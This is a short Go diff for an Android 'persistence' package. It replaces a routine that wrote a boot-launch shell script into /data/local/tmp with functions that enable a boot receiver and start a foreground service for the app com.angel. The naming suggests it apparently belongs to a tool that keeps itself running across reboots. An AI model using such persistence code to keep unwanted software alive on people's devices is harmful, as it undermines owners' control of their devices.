@@ -1,19 +1,25 @@
-package android
+//go:build android
+
+package persistence
 
 import (
-"os"
+"os/exec"
 )
 
-type BootCompleted struct{}
-
-func NewBootCompleted() *BootCompleted {
-return &BootCompleted{}
+func BootReceiver() bool {
+cmd := exec.Command("pm", "enable", "com.angel/.BootReceiver")
+err := cmd.Run()
+if err != nil {
+return false
+}
+return true
 }
 
-func (b *BootCompleted) CreateReceiver(execPath string) error {
-receiverContent := `#!/system/bin/sh
-am startservice -a android.intent.action.BOOT_COMPLETED
-` + execPath + ` &
-`
-return os.WriteFile("/data/local/tmp/boot_receiver.sh", []byte(receiverContent), 0755)
+func BootService() bool {
+cmd := exec.Command("am", "start-foreground-service", "-n", "com.angel/.Service")
+err := cmd.Run()
+if err != nil {
+return false
+}
+return true
 }
